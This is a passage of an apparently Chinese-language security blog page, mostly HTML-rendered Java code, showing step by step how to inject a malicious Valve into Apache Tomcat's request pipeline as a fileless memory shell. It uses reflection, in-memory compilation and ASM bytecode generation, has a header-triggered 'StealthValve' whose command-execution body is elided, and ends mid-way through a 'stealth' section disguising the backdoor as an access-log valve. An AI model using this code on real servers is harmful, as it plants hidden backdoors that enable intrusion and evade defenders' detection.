                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7">7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8">8</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 反射获取WebappClassLoader的resources字段
</span></span><span class="line"><span class="cl">Field resourcesField = WebappClassLoader.class.getDeclaredField(&#34;resources&#34;);
</span></span><span class="line"><span class="cl">resourcesField.setAccessible(true);
</span></span><span class="line"><span class="cl">StandardRoot standardRoot = (StandardRoot) resourcesField.get(classLoader);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 直接API调用获取Context
</span></span><span class="line"><span class="cl">Context context = standardRoot.getContext(); // Tomcat 8.5+
</span></span><span class="line"><span class="cl">StandardContext standardContext = (StandardContext) context;</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>步骤2：获取Pipeline对象（直接API）</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 直接调用StandardContext的API方法
</span></span><span class="line"><span class="cl">Pipeline pipeline = standardContext.getPipeline();</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>步骤3：创建恶意Valve实例</strong></p>
<h4 id="方法a动态类定义无文件落地">方法A：动态类定义（无文件落地）<a hidden class="anchor" aria-hidden="true" href="#方法a动态类定义无文件落地">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span><span class="lnt" id="27"><a class="lnlinks" href="#27">27</a>
</span><span class="lnt" id="28"><a class="lnlinks" href="#28">28</a>
</span><span class="lnt" id="29"><a class="lnlinks" href="#29">29</a>
</span><span class="lnt" id="30"><a class="lnlinks" href="#30">30</a>
</span><span class="lnt" id="31"><a class="lnlinks" href="#31">31</a>
</span><span class="lnt" id="32"><a class="lnlinks" href="#32">32</a>
</span><span class="lnt" id="33"><a class="lnlinks" href="#33">33</a>
</span><span class="lnt" id="34"><a class="lnlinks" href="#34">34</a>
</span><span class="lnt" id="35"><a class="lnlinks" href="#35">35</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 定义恶意Valve类（简化版）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">StealthValve</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ValveBase</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">TRIGGER_HEADER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;X-Health-Check&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="n">TRIGGER_HEADER</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 命令执行逻辑...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getNext</span><span class="p">().</span><span class="na">invoke</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 在内存中编译类（使用Java Compiler API）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">JavaCompiler</span><span class="w"> </span><span class="n">compiler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ToolProvider</span><span class="p">.</span><span class="na">getSystemJavaCompiler</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">StandardJavaFileManager</span><span class="w"> </span><span class="n">fileManager</span><span class="w"> </span><span class="o">=</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">compiler</span><span class="p">.</span><span class="na">getStandardFileManager</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 动态生成源码</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">sourceCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;...&#34;</span><span class="p">;</span><span class="w"> </span><span class="c1">// 完整的StealthValve源码</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">JavaFileObject</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="o">=</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">SimpleJavaFileObject</span><span class="p">(</span><span class="n">URI</span><span class="p">.</span><span class="na">create</span><span class="p">(</span><span class="s">&#34;string:///StealthValve.java&#34;</span><span class="p">),</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JavaFileObject</span><span class="p">.</span><span class="na">Kind</span><span class="p">.</span><span class="na">SOURCE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">CharSequence</span><span class="w"> </span><span class="nf">getCharContent</span><span class="p">(</span><span class="kt">boolean</span><span class="w"> </span><span class="n">ignoreEncodingErrors</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">sourceCode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 编译到内存</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">CompilationTask</span><span class="w"> </span><span class="n">task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">compiler</span><span class="p">.</span><span class="na">getTask</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">fileManager</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">(</span><span class="n">source</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">task</span><span class="p">.</span><span class="na">call</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 加载编译后的类</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">valveClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">classLoader</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="s">&#34;com.example.StealthValve&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Valve</span><span class="w"> </span><span class="n">evilValve</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Valve</span><span class="p">)</span><span class="w"> </span><span class="n">valveClass</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="方法b字节码注入asm增强">方法B：字节码注入（ASM增强）<a hidden class="anchor" aria-hidden="true" href="#方法b字节码注入asm增强">#</a></h4>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 使用ASM动态生成Valve字节码
</span></span><span class="line"><span class="cl">ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
</span></span><span class="line"><span class="cl">cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, 
</span></span><span class="line"><span class="cl">    &#34;com/evil/HealthCheckValve&#34;, null, 
</span></span><span class="line"><span class="cl">    &#34;org/apache/catalina/valves/ValveBase&#34;, null);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 生成invoke方法...
</span></span><span class="line"><span class="cl">MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, &#34;invoke&#34;, 
</span></span><span class="line"><span class="cl">    &#34;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V&#34;, 
</span></span><span class="line"><span class="cl">    null, null);
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">// 方法逻辑：检查Header-&gt;执行命令-&gt;回传结果
</span></span><span class="line"><span class="cl">mv.visitCode();
</span></span><span class="line"><span class="cl">// ... 字节码指令 ...
</span></span><span class="line"><span class="cl">mv.visitEnd();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 定义类
</span></span><span class="line"><span class="cl">byte[] bytecode = cw.toByteArray();
</span></span><span class="line"><span class="cl">Class&lt;?&gt; valveClass = classLoader.defineClass(
</span></span><span class="line"><span class="cl">    &#34;com.evil.HealthCheckValve&#34;, bytecode, 0, bytecode.length);
</span></span><span class="line"><span class="cl">Valve evilValve = (Valve) valveClass.newInstance();</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>步骤4：注入Valve到管道（API+反射）</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 直接API方式添加Valve
</span></span><span class="line"><span class="cl">pipeline.addValve(evilValve);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 调整位置到关键节点（反射操作）
</span></span><span class="line"><span class="cl">Field valvesField = pipeline.getClass().getDeclaredField(&#34;valves&#34;);
</span></span><span class="line"><span class="cl">valvesField.setAccessible(true);
</span></span><span class="line"><span class="cl">Valve[] valves = (Valve[]) valvesField.get(pipeline);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 查找StandardContextValve的位置
</span></span><span class="line"><span class="cl">int targetIndex = -1;
</span></span><span class="line"><span class="cl">for (int i = 0; i &lt; valves.length; i++) {
</span></span><span class="line"><span class="cl">    if (valves[i] instanceof StandardContextValve) {
</span></span><span class="line"><span class="cl">        targetIndex = i;
</span></span><span class="line"><span class="cl">        break;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 在StandardContextValve前插入
</span></span><span class="line"><span class="cl">if (targetIndex != -1) {
</span></span><span class="line"><span class="cl">    Valve[] newValves = new Valve[valves.length + 1];
</span></span><span class="line"><span class="cl">    System.arraycopy(valves, 0, newValves, 0, targetIndex);
</span></span><span class="line"><span class="cl">    newValves[targetIndex] = evilValve;
</span></span><span class="line"><span class="cl">    System.arraycopy(valves, targetIndex, newValves, 
</span></span><span class="line"><span class="cl">        targetIndex + 1, valves.length - targetIndex);
</span></span><span class="line"><span class="cl">    valvesField.set(pipeline, newValves);
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="三高级隐蔽技术">三、高级隐蔽技术<a hidden class="anchor" aria-hidden="true" href="#三高级隐蔽技术">#</a></h3>
<p><strong>1. Valve伪装技术</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span><span class="lnt" id="27"><a class="lnlinks" href="#27">27</a>
</span><span class="lnt" id="28"><a class="lnlinks" href="#28">28</a>
</span><span class="lnt" id="29"><a class="lnlinks" href="#29">29</a>
</span><span class="lnt" id="30"><a class="lnlinks" href="#30">30</a>
</span><span class="lnt" id="31"><a class="lnlinks" href="#31">31</a>
</span><span class="lnt" id="32"><a class="lnlinks" href="#32">32</a>
</span><span class="lnt" id="33"><a class="lnlinks" href="#33">33</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 继承官方Valve类，减少特征</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">AccessLogValveProxy</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AccessLogValve</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Valve</span><span class="w"> </span><span class="n">original</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Valve</span><span class="w"> </span><span class="n">malicious</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">AccessLogValveProxy</span><span class="p">(</span><span class="n">Valve</span><span class="w"> </span><span class="n">original</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">original</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">malicious</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createMaliciousValve</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 恶意逻辑检查</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isMaliciousRequest</span><span class="p">(</span><span class="n">request</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">malicious</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 正常逻辑</span><span class="w">
